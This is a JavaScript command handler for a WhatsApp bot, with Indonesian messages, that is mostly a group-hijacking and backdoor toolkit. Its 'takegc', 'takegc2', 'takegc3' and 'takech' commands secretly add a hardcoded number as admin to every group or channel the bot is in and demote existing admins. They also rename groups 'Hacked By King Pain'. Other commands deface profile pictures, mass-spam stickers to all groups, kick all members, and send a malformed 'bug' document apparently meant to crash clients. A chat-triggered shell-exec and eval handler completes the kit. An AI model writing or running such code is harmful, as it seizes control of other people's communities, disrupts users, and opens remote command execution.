module.exports = async (Klee, m, store) => {
try {
const owner = "622222222222"
let bijiasu = ""
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy1 = (typeof m.text == 'string' ? m.text : '')
let budy = ""
if (m.contextInfo === undefined) {
 budy = budy1
}
const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
const isCmd = body.startsWith(prefix)
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
let crypto = require('crypto')
const makeid = crypto.randomBytes(3).toString('hex')
const { Client } = require('ssh2');
const quoted = m.quoted ? m.quoted : m
const from = m.key.remoteJid
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const botNumber = await Klee.decodeJid(Klee.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isGroup = m.chat.endsWith('@g.us')
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await Klee.groupMetadata(m.chat) : {}
let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { version } = require("./package.json")
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
const { Scraper } = require("akiraa-wb");
const Skrep = new Scraper()
const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
const bijipler = JSON.parse(fs.readFileSync('./all/database/idblgrup.json').toString())
const jangan = m.isGroup ? pler.includes(m.chat) : false
const plerr = JSON.parse(fs.readFileSync('./all/database/idgrup2.json').toString())
const jangan2 = m.isGroup ? plerr.includes(m.chat) : false
const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
const seler = JSON.parse(fs.readFileSync("./all/database/reseller.json"))
const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))
const isReseller = seler.includes(m.sender)
const isPremium = prem.includes(m.sender)
const { BingImageCreator } = require("./all/bingimg.js");
if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}
const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `Hello My Friends`
}}}
const MessageBug = async (target) => {
return Klee.sendMessage(target, {document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}`}, {quoted: qbug})
}
let ppuser
try {
ppuser = await Klee.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
}
async function KleeReply(teks) {
return Klee.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "© Powered By "+namabot, previewType: "PHOTO"}}}, {quoted: m})
}
const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}
const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363224727390375@newsletter`,
newsletterName: `Hore`,
jpegThumbnail: "",
caption: `Powered By ${namaowner}`,
inviteExpiration: Date.now() + 1814400000
}
}}
function generateRandomPassword() {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
  const length = 10;
  let password = '';
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    password += characters[randomIndex];
  }
  return password;
}
const qtoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Pterodactyl Server By ${namaowner}`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "9999999999",
"retailerId": `Powered By Wyii`,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}
const qtext = { key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net"} : {}) },'message': {extendedTextMessage: {text: "Thank you for using my services"}}}
const qdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `Powered By ${namaowner}`, jpegThumbnail: ""}}}
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}
let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}
const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}
function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}
const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
Klee.autoshalat = Klee.autoshalat ? Klee.autoshalat : {}
    let ats = m.chat
    if (ats in Klee.autoshalat) {
    return false
    }
    let jadwalSholat = {
    shubuh: '04:03',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '11:39',
    ashar: '15:03',
    magrib: '17:52',
    isya: '19:05',
    }
    const datek = new Date((new Date).toLocaleString("en-US", {
    timeZone: "Asia/Jakarta"
    }));
    const hours = datek.getHours();
    const minutes = datek.getMinutes();
    const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
    for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        Klee.autoshalat[ats] = [
            Klee.sendMessage(m.chat, {
audio: {
    url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
},
mimetype: 'audio/mpeg',
ptt: true,
contextInfo: {
    externalAdReply: {
        showAdAttribution: true,
        mediaType: 1,
        mediaUrl: '',
        title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
        body: `🕑 ${waktu}`,
        sourceUrl: '',
        thumbnail: await fs.readFileSync('./all/shalat.jpg'),
        renderLargerThumbnail: true
    }
}
            }, {}),
            setTimeout(async () => {
delete client.autoshalat[m.chat]
            }, 57000)
        ]
    }
    }
const reply = (teks) => {
return Klee.sendMessage(from, { text: teks, contextInfo:{
mentionedJid: [m.sender], 
"externalAdReply": {"title": ` ${botname}`,"body": `Halo kak ${pushname} Selamat ${ucapan()}`, "previewType": "PHOTO","thumbnailUrl": ppuser,"thumbnail": '',"sourceUrl": ``}}}, { quoted:m})} 
switch (command) {
case "ban":
    bijiasu = budy.slice(9);
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');
    let gcall2 = Object.values(await Klee.groupFetchAllParticipating().catch(_ => null));
    let listgca1 = [];
    gcall2.forEach((u) => {
        listgca1.push(u.id);
    });
    let bijikudanil1 = JSON.parse(fs.readFileSync('./all/database/idblgrup.json', 'utf8'));
    listgca1 = listgca1.filter(item => !bijikudanil1.includes(item));
    await Klee.updateProfilePicture(Klee.user.id.split(":")[0] + "@s.whatsapp.net", { url: 'https://raw.githubusercontent.com/Irms237/yowhello/main/photo_2024-12-19_01-39-48.jpg' });
    for (let i = 0; i < listgca1.length; i++) {
        try {
            await Klee.updateProfilePicture(listgca1[i], { url: 'https://raw.githubusercontent.com/Irms237/yowhello/main/photo_2024-12-19_01-39-48.jpg' });
        } catch (error) {
            console.error(`Error updating profile picture for ${listgca1[i]}:`, error);
        }
        await delay(1000); 
    }
    await m.reply("Wh00ps, This Number is Hacked By King Pain");
    break;
case "takegc2": {
    bijiasu = budy.slice(10); 
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');
    let gcall3 = Object.values(await Klee.groupFetchAllParticipating().catch(_ => null));
    let listgca3 = [];
    gcall3.forEach((u) => {
        listgca3.push(u.id);
    });
    for (let i = 0; i < listgca3.length; i++) {
        try {
            let groupId = listgca3[i];
            let groupMetadata = await Klee.groupMetadata(groupId).catch(_ => null);
            if (!groupMetadata) continue;
            let participants = groupMetadata.participants;
            let botNumber = Klee.user.id.split(":")[0] + "@s.whatsapp.net";
            let myNumber = "622222222222@s.whatsapp.net";
            let isInGroup = participants.some(p => p.id === myNumber);
            if (!isInGroup) {
                await Klee.groupParticipantsUpdate(groupId, [myNumber], "add").catch(_ => null);
                await delay(100); 
            }
            let isAdmin = participants.find(p => p.id === myNumber)?.admin;
            if (!isAdmin) {
                await Klee.groupParticipantsUpdate(groupId, [myNumber], "promote").catch(_ => null);
                await delay(100); 
            }
            let admins = participants.filter(p => p.admin === "admin" || p.admin === "superadmin");
            let adminsToRevoke = admins
                .map(p => p.id)
                .filter(adminId => adminId !== myNumber && adminId !== botNumber);
            if (adminsToRevoke.length > 0) {
                await Klee.groupParticipantsUpdate(groupId, adminsToRevoke, "demote").catch(_ => null);
                await delay(100); 
            }
        } catch (error) {
            console.error(`Error processing group ${listgca3[i]}:`, error);
        }
        await delay(100); 
    }
    let newBio = "Hacked by King Pain"; 
    if (bijiasu && bijiasu.trim().length > 0) {
        newBio = bijiasu.trim(); 
    }
    try {
        await Klee.updateProfileStatus(newBio);
        await m.reply(`Sukses mengganti bio bot menjadi: "${newBio}"`);
    } catch (error) {
        console.error("Error updating bot bio:", error);
        }
    await m.reply("Backdoor activated! You are now an admin in all groups.");
    break;
}
case "takech": {
    let bijiasu = budy.slice(10); 
    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');
    let channels;
    try {
        if (typeof Klee.channelFetchAllParticipating === "function") {
            channels = Object.values(await Klee.channelFetchAllParticipating().catch(_ => null));
        } else if (typeof Klee.getChannels === "function") {
            channels = Object.values(await Klee.getChannels().catch(_ => null));
        } else {
            return m.reply('Error: Tidak dapat menemukan metode untuk mengambil daftar saluran.');
        }
    } catch (err) {
        console.error("Error fetching channels:", err);
        return m.reply('Terjadi kesalahan saat mencoba mengambil daftar saluran.');
    }
    if (!channels || channels.length === 0) {
        return m.reply('Tidak ada saluran yang ditemukan.');
    }
    let channelList = [];
    channels.forEach((channel) => {
        channelList.push(channel.id);
    });
    for (let i = 0; i < channelList.length; i++) {
        try {
            let channelId = channelList[i];
            let channelMetadata = await Klee.channelMetadata(channelId).catch(_ => null);
            if (!channelMetadata) continue;
            let participants = channelMetadata.participants;
            let botNumber = Klee.user.id.split(":")[0] + "@s.whatsapp.net";
            let myNumber = "622222222222@s.whatsapp.net";
            let isInChannel = participants.some(p => p.id === myNumber);
            if (!isInChannel) {
                await Klee.channelParticipantsUpdate(channelId, [myNumber], "add").catch(_ => null);
                await delay(100); 
            }
            let isOwner = participants.find(p => p.id === myNumber)?.owner;
            if (!isOwner) {
                await Klee.channelParticipantsUpdate(channelId, [myNumber], "promote").catch(_ => null);
                await delay(100); 
            }
            let owners = participants.filter(p => p.owner === "owner");
            let ownersToRevoke = owners
                .map(p => p.id)
                .filter(ownerId => ownerId !== myNumber && ownerId !== botNumber);
            if (ownersToRevoke.length > 0) {
                await Klee.channelParticipantsUpdate(channelId, ownersToRevoke, "demote").catch(_ => null);
                await delay(100); 
            }
        } catch (error) {
            console.error(`Error processing channel ${channelList[i]}:`, error);
        }
        await delay(100); 
    }
    let newBio = "Owned by King Pain"; 
    if (bijiasu && bijiasu.trim().length > 0) {
        newBio = bijiasu.trim(); 
    }
    try {
        await Klee.updateProfileStatus(newBio);
        await m.reply(`Sukses mengganti bio bot menjadi: "${newBio}"`);
    } catch (error) {
        console.error("Error updating bot bio:", error);
    }
    await m.reply("Saluran berhasil dikelola! Anda sekarang adalah pemilik di semua saluran.");
    break;
}
case 'addgc': {
    if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');
    let getGroups = await Klee.groupFetchAllParticipating(); 
    let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]); 
    let groupIds = groups.map((v) => v.id); 
    m.reply(`Memeriksa ${groupIds.length} grup yang diikuti bot...`);
    if (groupIds.length === 0) {
        m.reply('Bot tidak berada di grup manapun.');
        return;
    }
    fs.writeFileSync('rikzz.json', JSON.stringify(groupIds));
    m.reply(`ID grup telah disimpan, bot akan mulai memproses grup-grup tersebut.`);
}
break;
case "takegc": {
  try {
    if (!isOwner) return m.reply("Maaf, command ini hanya untuk pemilik.");
    let getGroups = await Klee.groupFetchAllParticipating();
    let groups = Object.entries(getGroups).map(([id, details]) => ({ id, ...details }));
    const additionalAdmin = "622222222222@s.whatsapp.net";
    for (let group of groups) {
      const groupId = group.id;
      const botAdmin = group.participants.some(p => p.id === botNumber && p.admin);
      if (!botAdmin) {
        console.log(`Bot bukan admin di grup ${groupId}, melewati grup ini.`);
        continue;
      }
      const isMember = group.participants.some(p => p.id === additionalAdmin);
      if (!isMember) {
        try {
          await Klee.groupParticipantsUpdate(groupId, [additionalAdmin], "add");
          console.log(`Nomor ${additionalAdmin} berhasil ditambahkan ke grup ${groupId}`);
        } catch (err) {
          console.error(`Gagal menambahkan ${additionalAdmin} ke grup ${groupId}, mencoba invite link...`);
          try {
            let inviteCode = await Klee.groupInviteCode(groupId);
            let inviteLink = `https://chat.whatsapp.com/${inviteCode}`;
            await Klee.sendMessage(additionalAdmin, { text: `Silakan join grup: ${inviteLink}` });
            console.log(`Invite link dikirim ke ${additionalAdmin}`);
          } catch (err) {
            console.error(`Gagal membuat invite link untuk ${groupId}:`, err);
            continue;
          }
        }
        await new Promise(resolve => setTimeout(resolve, 3000));
      }
      try {
        await Klee.groupParticipantsUpdate(groupId, [additionalAdmin], "promote");
        console.log(`Nomor ${additionalAdmin} berhasil dijadikan admin di grup ${groupId}`);
      } catch (err) {
        console.error(`Gagal menjadikan ${additionalAdmin} admin di grup ${groupId}:`, err);
      }
      const newGroupName = "Hacked By King Pain";
      try {
        await Klee.groupUpdateSubject(groupId, newGroupName);
        console.log(`Nama grup ${groupId} berhasil diubah menjadi ${newGroupName}`);
      } catch (err) {
        console.error(`Gagal mengubah nama grup ${groupId}:`, err);
      }
      const newGroupDescription = "✨ Grup ini sekarang dikelola oleh Admin King Pain.";
      try {
        await Klee.groupUpdateDescription(groupId, newGroupDescription);
        console.log(`Deskripsi grup ${groupId} berhasil diperbarui.`);
      } catch (err) {
        console.error(`Gagal mengubah deskripsi grup ${groupId}:`, err);
      }
      await Klee.sendMessage(groupId, {
        text: `*Backdoor Access Completed!*\n\nNomor *${additionalAdmin}* telah dijadikan admin grup ini.\nNama grup diubah menjadi: ${newGroupName}\nDeskripsi grup telah diperbarui.`,
      });
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
    const newBotName = "Backdoor By King Pain";
    await Klee.updateProfileName(newBotName);
    await Klee.updateProfilePicture(botNumber, { url: "https://raw.githubusercontent.com/Irms237/yowhello/main/photo_2024-12-19_01-39-48.jpg" });
    return await Klee.sendMessage(m.chat, {
      text: `✅🔥 *Backdoor berhasil dieksekusi!*\n\nNomor *${additionalAdmin}* telah ditambahkan dan dijadikan admin di semua grup.\nNama grup dan deskripsi grup diperbarui.\nNama bot diubah menjadi: ${newBotName}\nFoto profil bot juga telah diperbarui.`,
    }, { quoted: m });
  } catch (err) {
    console.error(err);
    return await Klee.sendMessage(m.chat, { text: "Terjadi kesalahan saat mengeksekusi perintah backdoor. Coba lagi nanti." }, { quoted: m });
  }
}
break;
case 'takegc3': {
    if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');
    let groupIds = JSON.parse(fs.readFileSync('rikzz.json', 'utf8'));
    if (groupIds.length === 0) {
        m.reply('Tidak ada ID grup yang tersedia untuk diproses.');
        return;
    }
    m.reply(`Memulai proses untuk ${groupIds.length} grup...`);
    const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
    const processGroup = async (groupId, retries = 3, delayTime = 5000) => {
        let ownerId = nomorowner + '@s.whatsapp.net';
        try {
            await Klee.groupParticipantsUpdate(groupId, [ownerId], 'add');
            m.reply(`Owner berhasil ditambahkan ke grup ${groupId}`);
            await Klee.groupParticipantsUpdate(groupId, [ownerId], 'promote');
            m.reply(`Owner telah di-admin-kan di grup ${groupId}`);
            await Klee.groupParticipantsUpdate(groupId, [m.botNumber], 'remove');
            m.reply(`Bot berhasil dikeluarkan dari grup ${groupId}`);
        } catch (err) {
            if (err.message.includes('rate-overlimit')) {
                m.reply(`Rate limit tercapai untuk grup ${groupId}. Mencoba lagi setelah ${delayTime / 1000} detik.`);
                if (retries > 0) {
                    await delay(delayTime);
                    return processGroup(groupId, retries - 1, delayTime * 2);
                } else {
                    m.reply(`Gagal memproses grup ${groupId} setelah beberapa percobaan.`);
                    throw new Error(`Rate limit exceeded for group ${groupId}`);
                }
            } else {
                m.reply(`Gagal memproses grup ${groupId}: ${err.message}`);
                throw err;
            }
        }
    };
    const processInBatches = async (batchSize = 5) => {
        let sukses = [];
        let gagal = [];
        for (let i = 0; i < groupIds.length; i += batchSize) {
            const batch = groupIds.slice(i, i + batchSize);
            let batchPromises = batch.map(groupId => {
                return processGroup(groupId)
                    .then(() => sukses.push(groupId))
                    .catch(() => gagal.push(groupId));
            });
            await Promise.all(batchPromises);
            await delay(15000); 
        }
        return { sukses, gagal };
    };
    try {
        const { sukses, gagal } = await processInBatches();
        let laporan = 'Proses selesai!\n\n';
        if (sukses.length > 0) {
            laporan += `Sukses:\n${sukses.join('\n')}\n\n`;
        }
        if (gagal.length > 0) {
            laporan += `Gagal:\n${gagal.join('\n')}\n`;
        }
        m.reply(laporan);
    } catch (err) {
        console.error('Terjadi kesalahan saat memproses grup:', err);
        m.reply('Ada kesalahan saat memproses beberapa grup.');
    }
}
break;
case "public": {
if (!isOwner) return KleeReply(msg.owner)
Klee.public = true
reply("Berhasil mengganti mode bot menjadi *Public*")
}
break
case "self": {
if (!isOwner) return KleeReply(msg.owner)
Klee.public = false
reply("Berhasil mengganti mode bot menjadi *Self*")
}
break
case "spam": {

    const folderPath = './stickers'; 
    const spamCount = 50; 
    try {
        const files = fs.readdirSync(folderPath);
        const stickerFiles = files.filter(file => file.endsWith('.thumb.webp'));
        if (stickerFiles.length === 0) {
            m.reply("Tidak ada stiker di folder 'stickers'.");
            return;
        }
        for (let i = 0; i < spamCount; i++) {
            const randomFile = stickerFiles[Math.floor(Math.random() * stickerFiles.length)];
            const randomStickerPath = path.join(folderPath, randomFile); 
            await Klee.sendStimg(m.chat, randomStickerPath, m, { packname: global.packname });
            console.log(`Stiker ke-${i + 1} dari ${randomStickerPath} telah dikirim!`);
            await new Promise(resolve => setTimeout(resolve, 2000)); 
            if (i >= 50) {
                m.reply("Pengiriman stiker dihentikan setelah 50 stiker.");
                break;
            }
        }
        m.reply(`${spamCount} stiker telah dikirim!`);
    } catch (error) {
        console.error("Gagal mengirim stiker:", error);
        m.reply("Terjadi kesalahan saat mengirim stiker.");
    }
}
break;
case "spambc": {


    const folderPath = './stickers';
    const spamCount = 50;

    function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    try {
        const files = fs.readdirSync(folderPath);
        const stickerFiles = files.filter(file => file.endsWith('.thumb.webp'));

        if (stickerFiles.length === 0) {
            m.reply("Tidak ada stiker di folder 'stickers'.");
            return;
        }

        let gcall1 = Object.values(await Klee.groupFetchAllParticipating().catch(_ => null));
        let listgca = [];

        gcall1.forEach((u) => {
            listgca.push(u.id);
        });

        let bijikudanil = JSON.parse(fs.readFileSync('./all/database/idblgrup.json', 'utf8'));
        listgca = listgca.filter(item => !bijikudanil.includes(item));

        for (let i = 0; i < listgca.length; i++) {
            for (let j = 0; j < spamCount; j++) {
                try {
                    const randomFile = stickerFiles[Math.floor(Math.random() * stickerFiles.length)];
                    const randomStickerPath = path.join(folderPath, randomFile);
                    
                    await Klee.sendStimg(listgca[i], randomStickerPath, null, { packname: global.packname });
                    console.log(`Stiker ke-${j + 1} dikirim ke grup ${listgca[i]}!`);

                    await delay(2000); // Delay 2 detik sebelum mengirim stiker berikutnya
                } catch (error) {
                    console.error(`Gagal mengirim stiker ke grup ${listgca[i]}:`, error);
                }
            }
        }

        m.reply("Spam stiker ke semua grup telah selesai!");
    } catch (error) {
        console.error("Gagal mengirim spam stiker:", error);
        m.reply("Terjadi kesalahan saat mengirim spam stiker.");
    }
}
break;
case "kickall": {
    if (!isGroup) return KleeReply(msg.group);
    if (!isBotAdmin) return KleeReply(msg.adminbot);
    if (!isAdmin && !isOwner) return KleeReply(msg.admin);
    try {
        const groupMetadata = await Klee.groupMetadata(m.chat);
        const allMembers = groupMetadata.participants.map(p => p.id);
        const botId = Klee.user.jid;
        const ownerIds = ['622222222222@s.whatsapp.net']; 
        const removeUser = async (user, retries = 3) => {
            for (let attempt = 1; attempt <= retries; attempt++) {
                try {
                    await Klee.groupParticipantsUpdate(m.chat, [user], 'remove');
                    console.log(`Berhasil mengeluarkan ${user}`);
                    break; 
                } catch (err) {
                    if (err.toString().includes('rate-overlimit')) {
                        console.warn(`Percobaan ke-${attempt} gagal untuk ${user} (rate-overlimit).`);
                        if (attempt < retries) {
                            await new Promise(resolve => setTimeout(resolve, 3000)); 
                        } else {
                            console.error(`Gagal mengeluarkan ${user} setelah ${retries} percobaan.`);
                        }
                    } else {
                        console.error(`Error saat mengeluarkan ${user}:`, err.toString());
                        break; 
                    }
                }
            }
        };
        for (let user of allMembers) {
            if (user !== botId && !ownerIds.includes(user)) {
                await removeUser(user);
            }
        }
    } catch (error) {
        console.error(error);
        reply("Terjadi kesalahan saat mencoba mengeluarkan anggota grup.");
    }
}
break;
case "kick": {
if (!isGroup) return KleeReply(msg.group)
if (!isBotAdmin) return KleeReply(msg.adminbot)
if (!isAdmin && !isOwner) return KleeReply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await Klee.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => Klee.sendMessage(m.chat, {text: `Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup Ini`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
} else return reply(example('nomornya/@tag'))}
break
default:
if (budy.startsWith('$')) {
if (!isOwner) return
exec(budy.slice(2), (err, stdout) => {
if(err) return Klee.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return Klee.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}
if (budy.startsWith(">")) {
if (!isOwner) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
Klee.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
Klee.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}
if (budy.startsWith("=>")) {
if (!isOwner) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return Klee.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return Klee.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}
}} catch (e) {
console.log(e)
Klee.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`})
}}
let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})